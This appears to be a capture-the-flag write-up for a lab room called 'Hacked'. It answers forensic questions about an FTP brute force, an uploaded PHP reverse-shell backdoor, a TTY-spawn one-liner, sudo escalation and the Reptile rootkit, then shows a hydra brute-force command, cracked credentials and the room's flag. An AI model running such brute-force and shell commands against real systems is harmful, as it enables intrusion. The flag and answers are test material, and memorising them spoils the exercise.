# Hacked 




## Oh No! we have been hacked

| Questions | Answers |
|-----------|---------|
| The attacker is trying to log into a specific service. What service is this? | ftp |
| There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool ? | hydra |
| The attacker is trying to log on with a specific username. What is the username ? | jenny |
| What is the user's password ? | password123 |
| What is the current FTP working directory after the attacker logged in? | /var/www/html |
| The attacker uploaded a backdoor. What is the backdoor's file name ? | shell.php |
| The backdoor can be downloaded from a specific URL, as it is located inside the uploaded file. What is the ful URL? | http://pentestmonkey.net/tools/php-reverse-shell |
| Whcih command did the attacker manually execute after getting a reverse shell? | whoami |
| What is the computer's hostname? | wir3 |
| Which command did the attacker execute to spawn a new TTY shell? | python -c 'import pty; pty.spawn("/bin/sh")' |
| Which command was executed to gain a root shell? | sudo su |
| The attacker downloaded something from GitHub. What is the name of the GitHub Project ? | reptile |
| The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called? | rootkit |

## hack your way back into the machine

machine ip : `10.10.67.33`
bruteforcing the ftp using hydra
```
hydra -l jenny -P /usr/share/wordlists/rockyou.txt 10.10.67.33 ftp -t 4 
```
found credentials
> [21][ftp] host: 10.10.67.33   login: jenny   password: 987654321


| Questions | Answers |
|-----------|---------|
| Read the flag.txt file inside the Reptile directory | ebcefd66ca4b559d17b440b6e67fd0fd | 
